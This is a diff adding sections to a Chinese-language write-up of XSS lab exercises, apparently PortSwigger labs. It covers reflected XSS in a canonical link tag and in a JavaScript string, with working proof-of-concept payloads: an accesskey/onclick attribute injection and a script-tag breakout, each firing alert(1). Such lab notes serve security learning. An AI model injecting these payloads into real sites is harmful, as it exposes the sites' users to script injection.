@@ -148,3 +148,34 @@ payload
 
 #### 8.Reflected XSS in canonical link tag
 
+按键触发。canonical link tag。
+
+![8](_XSS-hard_image/8.png)
+
+发现位置。
+
+首先需要闭合前面的，双引号被过滤了，用单引号。
+
+payload：
+
+```
+url/?%27accesskey=%27x%27onclick=%27alert(1)
+url/?%27accesskey=%27x%27onclick=%27alert(1)%27
+```
+
+#### 9.Reflected XSS into a JavaScript string with single quote and backslash escaped
+
+![9](_XSS-hard_image/9.png)
+
+找到位置。
+
+没有过滤，直接闭合前面的script
+
+payload：
+
+```
+</script><script>alert(1)</script>
+```
+
+#### 10.Reflected XSS into a JavaScript string with angle brackets HTML encoded
+
